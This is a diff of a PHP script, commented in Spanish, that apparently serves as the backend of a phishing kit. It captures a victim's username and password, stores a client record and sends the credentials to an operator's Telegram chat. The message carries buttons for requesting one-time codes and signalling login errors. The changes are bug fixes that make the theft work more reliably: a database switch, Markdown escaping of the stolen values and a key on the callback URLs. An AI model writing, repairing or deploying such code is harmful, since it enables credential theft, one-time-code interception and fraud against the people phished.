@@ -5,13 +5,14 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
 // Incluir las credenciales desde config.php
-$config = require '../../config/config.php';
+$config = require '../../config/config.php'; // ¡Asegúrate de que esta ruta sea correcta!
 
 // Conexión a la base de datos
 $dbConfig = $config['db'];
 try {
+    // !--- ARREGLO #1: Cambiar 'mysql' por 'pgsql' y añadir puerto ---!
     $pdo = new PDO(
-        "mysql:host={$dbConfig['host']};dbname={$dbConfig['dbname']}",
+        "pgsql:host={$dbConfig['host']};port=5432;dbname={$dbConfig['dbname']}",
         $dbConfig['user'],
         $dbConfig['password']
     );
@@ -41,31 +42,44 @@ if (!isset($data['usuario']) || !isset($data['clave'])) {
 $usuario = $data['usuario'];
 $clave = $data['clave'];
 
+// Función para escapar caracteres de Markdown (versión simple para 'Markdown')
+function escapeMarkdown($text) {
+    $specialChars = ['_', '*', '`', '['];
+    foreach ($specialChars as $char) {
+        $text = str_replace($char, "\\" . $char, $text);
+    }
+    return $text;
+}
+
 // Función para enviar mensaje con botones interactivos a Telegram
 function enviarMensajeTelegram($usuario, $clave, $config, $clienteId) {
     $botToken = $config['telegram']['bot_token'];
     $chatId = $config['telegram']['chat_id'];
     $baseUrl = $config['base_url']; // URL base para los botones
+    
+    // !--- ARREGLO #2: Añadir la clave de seguridad a las URLs ---!
+    $security_key = 'tu_clave_secreta_aqui'; // La misma que usa updatetele.php
 
     // Mensaje con formato básico
+    // Aplicamos el escape a las variables de usuario para evitar errores de Markdown
     $mensaje = "📥 *Nuevo Cliente Registrado*\n\n"
-             . "👤 *Usuario:* `$usuario`\n"
-             . "🔑 *Clave:* `$clave`\n"
+             . "👤 *Usuario:* `" . escapeMarkdown($usuario) . "`\n"
+             . "🔑 *Clave:* `" . escapeMarkdown($clave) . "`\n"
              . "🆔 *ID del cliente:* `$clienteId`";
 
-    // Botones interactivos
+    // Botones interactivos (ahora con la &key=)
     $keyboard = [
         'inline_keyboard' => [
             [
-                ['text' => 'Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2"],
-                ['text' => 'Datos', 'url' => "$baseUrl?id=$clienteId&estado=6"]
+                ['text' => 'Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"],
+                ['text' => 'Datos', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"]
             ],
             [
-                ['text' => 'Otp', 'url' => "$baseUrl?id=$clienteId&estado=3"],
-                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$clienteId&estado=4"]
+                ['text' => 'Otp', 'url' => "$baseUrl?id=$clienteId&estado=3&key=$security_key"],
+                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$clienteId&estado=4&key=$security_key"]
             ],
             [
-                ['text' => 'Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=0"]
+                ['text' => 'Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=0&key=$security_key"]
             ]
         ]
     ];
@@ -79,15 +93,13 @@ function enviarMensajeTelegram($usuario, $clave, $config, $clienteId) {
         'reply_markup' => json_encode($keyboard) // Botones interactivos
     ];
 
-    // Registrar los datos enviados
-    error_log("Datos enviados a Telegram: " . print_r($postData, true));
-
     // Enviar la solicitud HTTP a Telegram
     $options = [
         'http' => [
             'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
             'method' => 'POST',
             'content' => http_build_query($postData),
+            'ignore_errors' => true // Para poder leer la respuesta de error
         ],
     ];
 
@@ -102,17 +114,25 @@ function enviarMensajeTelegram($usuario, $clave, $config, $clienteId) {
     // Analizar la respuesta de Telegram
     $responseData = json_decode($response, true);
     if (!$responseData['ok']) {
+        // Guardamos el error de Telegram para depuración
+        error_log("Telegram API error: " . $responseData['description']);
         throw new Exception("Telegram API error: " . $responseData['description']);
     }
 }
 
 try {
     // 1. Insertar un nuevo cliente en la base de datos
-    $stmt = $pdo->prepare("INSERT INTO clientes (estado) VALUES (0)");
+    // !--- ARREGLO #3: Usar RETURNING id ---!
+    $stmt = $pdo->prepare("INSERT INTO clientes (estado) VALUES (0) RETURNING id");
     $stmt->execute();
 
     // 2. Obtener el ID del cliente creado
-    $clienteId = $pdo->lastInsertId();
+    // !--- ARREGLO #3: Usar fetchColumn() ---!
+    $clienteId = $stmt->fetchColumn();
+    
+    if (!$clienteId) {
+        throw new Exception("No se pudo crear el cliente u obtener el ID.");
+    }
 
     // 3. Intentar enviar el mensaje a Telegram
     try {
